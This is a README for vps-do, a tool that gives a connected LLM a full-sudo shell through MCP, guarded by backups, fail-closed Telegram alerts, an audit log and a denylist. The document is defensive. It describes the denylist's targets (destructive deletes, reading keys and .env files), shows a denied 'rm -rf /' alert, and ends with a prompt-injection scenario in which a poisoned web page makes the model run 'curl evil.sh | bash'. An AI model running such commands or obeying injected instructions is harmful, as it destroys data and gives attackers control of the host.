# vps-do — the working half (read this twice)

[vps-look](../look/) lets your LLM *see* the box. vps-do lets it *fix* the
box: one MCP tool, `run(command)`, a shell executed as a dedicated user
with **full sudo**. Plus `backup_now()`.

That is a root shell behind a URL. We ship it anyway, because the honest
alternative most people end up with is pasting their root password into a
chat window. vps-do exists to make the dangerous thing *boring, announced
and reversible*:

## The guardrails, in the order they fire

1. **It is off.** The systemd unit is installed disabled. A work session
   starts when a human runs `systemctl start vps-do` (SSH or the optional
   [doorbell](../doorbell/)) — and `RuntimeMaxSec=2h` stops it after two
   hours even if everyone forgets.
2. **It backs up before it works.** On start, every configured data
   directory is snapshotted (SQLite databases via the SQLite backup API,
   so snapshots are consistent under load; everything else tarred; newest
   10 sets kept). The summary is sent to your Telegram. **If the backup or
   the report fails, the service refuses to start.**
3. **Every command is announced before it runs.** `run()` first sends the
   full command text to your dedicated Telegram alert bot and only
   executes when Telegram confirms delivery — *fail-closed*. Afterwards it
   sends the exit code and duration. Blocked commands are announced too.
4. **A denylist blocks the classic accidents**: `rm -rf` of system paths
   or your app's paths, disk formatting/partitioning, `dd` onto a block
   device, editing sudoers, reading `.env` files, SSH private keys or the
   connectors' own config, modifying the connectors' own files, and
   stopping/disabling the connectors themselves. **It is a heuristic
   accident net, not a security boundary.** Anyone who can phrase a
   command can eventually phrase one around it. Guardrails 1–3 are what
   let you sleep.
5. **An append-only local audit log** (`chattr +a` recommended) mirrors
   every start, execution, block and refusal, in case Telegram is down or
   disputed.

Outputs are secret-redacted and truncated at 20,000 characters, same as
vps-look.

## Install (Debian/Ubuntu, Python ≥ 3.11, MCP Python SDK installed)

```bash
# 1. Telegram alert bot: @BotFather -> /newbot. Then message the bot from
#    your account once and find your chat id via getUpdates.
# 2. Users and layout:
sudo useradd --system --no-create-home --shell /usr/sbin/nologin vpsdo
sudo mkdir -p /usr/local/lib/vps-do/app /usr/local/lib/vps-do/bin /etc/vps-do /var/log/vps-do /var/backups/vps-do
sudo cp server.py /usr/local/lib/vps-do/app/
sudo cp backup.py tg_send.py /usr/local/lib/vps-do/bin/
sudo chmod 755 /usr/local/lib/vps-do/bin/*.py
sudo cp config.example.toml /etc/vps-do/config.toml   # then edit it
sudo cp alert.env.example /etc/vps-do/alert.env       # then fill it in
sudo chmod 600 /etc/vps-do/alert.env
# 3. The path key (kept out of the process list by systemd LoadCredential):
python3 -c "import secrets; print(secrets.token_urlsafe(32))" | sudo tee /etc/vps-do/key >/dev/null
sudo chmod 600 /etc/vps-do/key
# 4. Sudo — read sudoers.example first; it explains itself:
sudo cp sudoers.example /etc/sudoers.d/vpsdo && sudo chmod 440 /etc/sudoers.d/vpsdo
sudo visudo --check
# 5. Audit log, append-only:
sudo touch /var/log/vps-do/audit.log
sudo chown root:vpsdo /var/log/vps-do/audit.log && sudo chmod 640 /var/log/vps-do/audit.log
sudo chattr +a /var/log/vps-do/audit.log
# 6. The unit — installed DISABLED, that is a feature:
sudo cp vps-do.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl status vps-do   # should say disabled / inactive
```

Proxy it next to vps-look (see `../examples/caddy.example`) at
`https://<public_host>/vps-do/<key>/mcp` and add it as a second connector.

## What the Telegram alerts look like

Every command produces two messages on your alert chat — one *before*
it runs, one after — and a denied command produces one as well:

```
▶️ vps-do EXEC
cmd: systemctl status myapp
```
```
⏹ vps-do DONE rc=0 dur=0.4s
cmd: systemctl status myapp
```
```
⛔ vps-do DENIED (denylist: recursive delete at filesystem root)
cmd: rm -rf /
```

Session start sends a backup report first; if that report cannot be
delivered, the service will not start accepting commands. And if a
pre-execution alert fails to send, the command is **refused** — the
alert channel failing closed is the whole point: if you cannot see what
it does, it does not get to do anything.

## A work session

```bash
ssh your-box
sudo systemctl start vps-do     # backup runs, Telegram reports, then it serves
# ... your LLM diagnoses and repairs; your phone buzzes for every command ...
sudo systemctl stop vps-do      # or let the 2h limit stop it
```

## What vps-do is not

- Not a sandbox, not multi-user, not safe to expose to a model you don't
  trust with root. Prompt injection against a connected model is a real
  threat model here: a poisoned web page that convinces the model to run
  `curl evil.sh | bash` will be announced to your phone — as it runs.
  The announcement is a record and a chance to intervene, not a veto.
- Not a substitute for [vps-look](../look/). Use look for the 95% of
  questions that are just questions. Open do when something is actually
  broken.
